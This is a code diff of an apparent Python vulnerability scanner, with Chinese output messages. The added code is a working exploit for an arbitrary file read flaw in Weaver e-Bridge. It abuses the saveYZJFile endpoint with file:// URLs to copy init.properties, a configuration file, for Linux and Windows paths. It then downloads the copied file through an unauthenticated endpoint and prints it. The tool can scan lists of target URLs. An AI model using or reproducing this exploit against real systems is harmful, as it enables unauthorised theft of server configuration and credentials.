@@ -34,22 +34,48 @@ class information(object):
 
     def target_url(self):
         color = "red"
-        payload = self.url + "/api/scrape/kube-system" 
+        #payload = self.url + "/wxjsapi/saveYZJFile?fileName=test&downloadUrl=file:///weaver/ebridge/tomcat/webapps/ROOT/WEB-INF/classes/init.properties&fileExt=txt" 
         headers = {
             "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:87.0) Gecko/20100101 Firefox/87.0"
         }  
 
         proxies = {
             "http": "127.0.0.1:8080"
-        }      
-        try:
-            res = requests.get(url=payload, headers=headers, verify=False, timeout=5)
-            if res.status_code == 200 and "kubernetes.io" in res.text:
-                cprint(f"[{chr(8730)}] 目标系统: {self.url} 存在信息泄漏!",color)
-            else:
-                print(f"[x] 目标系统: {self.url} 不存在信息泄漏")
-        except Exception as e:
-            print(f"[x] 目标系统: {self.url} 连接错误！")
+        } 
+        status = []
+        id_list = []
+        list = ["/wxjsapi/saveYZJFile?fileName=test&downloadUrl=file:///weaver/ebridge/tomcat/webapps/ROOT/WEB-INF/classes/init.properties&fileExt=txt", "/wxjsapi/saveYZJFile?fileName=test&downloadUrl=file:///d://ebridge/tomcat/webapps/ROOT/WEB-INF/classes/init.properties&fileExt=txt"]
+        for i in list: 
+            payload = self.url + i  
+            try:
+                res = requests.get(url=payload, headers=headers, verify=False, timeout=5)
+                if res.status_code == 200 and "filesize" in res.text:
+                    id = res.json()["id"]
+                    status.append(True)
+                    id_list.append(id)
+            except Exception as e:
+                print(f"[x] 目标系统: {self.url} 连接错误！")
+        information.result_show(self, status,id_list)
+    
+    def result_show(self, status,id_list):
+        headers = {
+            "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:87.0) Gecko/20100101 Firefox/87.0"
+        } 
+        print(id_list,status)
+        color = "red"
+        if not status:
+            print(f"[x] 目标系统: {self.url} 不存在文件读取漏洞")
+        elif status[0] == True:
+            cprint(f"[{chr(8730)}] 目标系统: {self.url} 为Linux系统",color)
+            cprint(f"[{chr(8730)}] 目标系统: {self.url} 的ID值为:{id_list[0]}",color)
+        elif status[1] == True:
+            cprint(f"[{chr(8730)}] 目标系统: {self.url} 为Windows系统",color)
+            cprint(f"[{chr(8730)}] 目标系统: {self.url} 的ID值为:{id_list[0]}",color)
+        if id_list:
+            res = requests.get(url=self.url + f"/file/fileNoLogin/{id_list[0]}", headers=headers, verify=False, timeout=5)
+            print(res.text)
+
+
 
     def file_url(self):
         with open(self.file, "r") as urls:
